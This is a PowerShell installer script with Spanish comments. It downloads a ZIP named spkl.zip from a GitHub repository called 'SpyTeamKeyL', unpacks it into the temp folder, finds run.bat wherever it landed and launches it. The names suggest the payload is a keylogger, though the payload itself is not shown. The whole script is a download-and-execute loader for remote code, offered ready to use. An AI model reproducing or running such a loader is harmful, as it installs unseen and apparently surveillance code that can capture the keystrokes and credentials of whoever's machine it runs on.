# 1. Definir rutas y limpiar temporales anteriores
$url = "https://github.com/Galavic/SpyTeamKeyL/raw/refs/heads/main/spkl.zip"
$baseDir = "$env:TEMP\spkl_install"
$zipPath = "$baseDir\paquete.zip"

if (Test-Path $baseDir) { Remove-Item $baseDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $baseDir | Out-Null

# 2. Descargar el ZIP
try {
    Write-Host "Descargando archivos..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
} catch {
    Write-Host "Error en la descarga: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Presiona Enter para salir"
    exit
}

# 3. Extraer el ZIP
try {
    Write-Host "Extrayendo..." -ForegroundColor Cyan
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $baseDir)
} catch {
    Write-Host "Error al extraer: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Presiona Enter para salir"
    exit
}

# 4. BUSCAR run.bat (Truco: lo busca recursivamente donde sea que haya quedado)
$batFile = Get-ChildItem -Path $baseDir -Filter "run.bat" -Recurse | Select-Object -First 1

if ($batFile) {
    Write-Host "Ejecutando $($batFile.FullName)..." -ForegroundColor Green
    
    # 5. Ejecutar estableciendo el directorio de trabajo correcto
    # Usamos /k para que la ventana NO se cierre y veas si hay errores
    Start-Process cmd -ArgumentList "/k `"$($batFile.Name)`"" -WorkingDirectory $batFile.Directory.FullName
} else {
    Write-Host "ERROR: No se encontró 'run.bat' dentro del ZIP descargado." -ForegroundColor Red
    Write-Host "Contenido extraído:"
    Get-ChildItem $baseDir -Recurse | Select-Object FullName
    Read-Host "Presiona Enter para salir"
}
